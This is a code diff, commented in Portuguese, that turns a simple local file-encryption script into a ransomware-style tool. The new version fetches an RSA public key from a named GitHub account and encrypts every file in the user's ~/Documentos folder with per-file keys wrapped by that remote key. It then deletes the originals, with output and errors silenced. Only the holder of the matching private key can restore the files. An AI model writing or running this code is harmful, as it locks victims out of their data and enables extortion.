@@ -1,61 +1,88 @@
 import os
+import requests
 from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import serialization, hashes
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.backends import default_backend
 
-# --- Passo 1: Gerar e Salvar a Chave ---
-# ATENÇÃO: Se você perder o arquivo 'chave.key', perde os arquivos para sempre!
-def gerar_ou_carregar_chave():
-    nome_arquivo = "chave.key"
-    if not os.path.exists(nome_arquivo):
-        chave = Fernet.generate_key()
-        with open(nome_arquivo, "wb") as arquivo_chave:
-            arquivo_chave.write(chave)
-        print(f"✨ Nova chave gerada e salva em '{nome_arquivo}'!")
-    else:
-        with open(nome_arquivo, "rb") as arquivo_chave:
-            chave = arquivo_chave.read()
-        print(f"💡 Chave carregada de '{nome_arquivo}'.")
-    return chave
+# Configurações
+EXTENSAO_PROTEGIDA = ".cld"
+GITHUB_USER = "sebasthub"  # <--- Coloque seu usuário aqui!
 
-# --- Passo 2: O Processo de Encriptação ---
-def encriptar_pasta(caminho_pasta, chave):
-    f = Fernet(chave)
-    contador = 0
+def obter_chave_publica_github(usuario):
+    print(f"🌍 Conectando ao GitHub de {usuario}...")
+    url = f"https://github.com/{usuario}.keys"
     
-    # 'os.walk' percorre todas as subpastas e arquivos
-    for raiz, diretorios, arquivos in os.walk(caminho_pasta):
-        for arquivo in arquivos:
-            # Pula o próprio script e a chave para não dar erro
-            if arquivo == "chave.key" or arquivo.endswith(".py"):
-                continue
-                
-            caminho_completo = os.path.join(raiz, arquivo)
+    try:
+        resposta = requests.get(url)
+        if resposta.status_code != 200:
+            raise Exception("Não consegui acessar o perfil.")
             
+        chaves = resposta.text.splitlines()
+        
+        # Procura por uma chave RSA (necessária para encriptação)
+        for linha_chave in chaves:
+            if linha_chave.startswith("ssh-rsa"):
+                public_key = serialization.load_ssh_public_key(
+                    linha_chave.encode(),
+                    backend=default_backend()
+                )
+                return public_key
+        
+        return None
+        
+    except Exception as e:
+        return None
+
+def encriptar_pasta(caminho_pasta, public_key):
+    contador = 0
+
+    for raiz, dirs, arquivos in os.walk(caminho_pasta):
+        for arquivo in arquivos:
+            # Ignora arquivos já protegidos ou scripts
+            if arquivo.endswith(EXTENSAO_PROTEGIDA) or arquivo.endswith(".py"):
+                continue
+
+            caminho_completo = os.path.join(raiz, arquivo)
+
             try:
-                # Lê o arquivo original
-                with open(caminho_completo, "rb") as arquivo_original:
-                    dados = arquivo_original.read()
-                
-                # Encripta os dados
-                dados_encriptados = f.encrypt(dados)
-                
-                # Sobrescreve o arquivo com os dados encriptados
-                with open(caminho_completo, "wb") as arquivo_encriptado:
-                    arquivo_encriptado.write(dados_encriptados)
-                
-                print(f"🔒 Encriptado: {arquivo}")
+                # 1. Gera chave simétrica temporária
+                chave_simetrica = Fernet.generate_key()
+                fernet = Fernet(chave_simetrica)
+
+                # 2. Lê e encripta o arquivo
+                with open(caminho_completo, "rb") as f:
+                    dados = f.read()
+                dados_encriptados = fernet.encrypt(dados)
+
+                # 3. Encripta a chave simétrica com a PÚBLICA do GitHub
+                chave_simetrica_encriptada = public_key.encrypt(
+                    chave_simetrica,
+                    padding.OAEP(
+                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                        algorithm=hashes.SHA256(),
+                        label=None
+                    )
+                )
+
+                # 4. Salva o arquivo protegido
+                novo_caminho = caminho_completo + EXTENSAO_PROTEGIDA
+                with open(novo_caminho, "wb") as f_out:
+                    f_out.write(len(chave_simetrica_encriptada).to_bytes(4, 'big'))
+                    f_out.write(chave_simetrica_encriptada)
+                    f_out.write(dados_encriptados)
+
+                os.remove(caminho_completo)
                 contador += 1
+
             except Exception as e:
-                print(f"❌ Erro ao encriptar {arquivo}: {e}")
+                pass
+    
 
-    print(f"\n✨ Processo finalizado! Total de arquivos protegidos: {contador}")
-
-# --- Execução Principal ---
 if __name__ == "__main__":
-    # Pega o caminho da pasta Documentos do usuário atual no Ubuntu
-    pasta_documentos = os.path.expanduser("~/Documentos")
+    pasta = os.path.expanduser("~/Documentos")
     
-    print(f"📂 Alvo: {pasta_documentos}")
-    print("Iniciando protocolo de segurança... 💖")
+    chave_pub = obter_chave_publica_github(GITHUB_USER)
     
-    minha_chave = gerar_ou_carregar_chave()
-    encriptar_pasta(pasta_documentos, minha_chave)
+    if chave_pub:
+        encriptar_pasta(pasta, chave_pub)
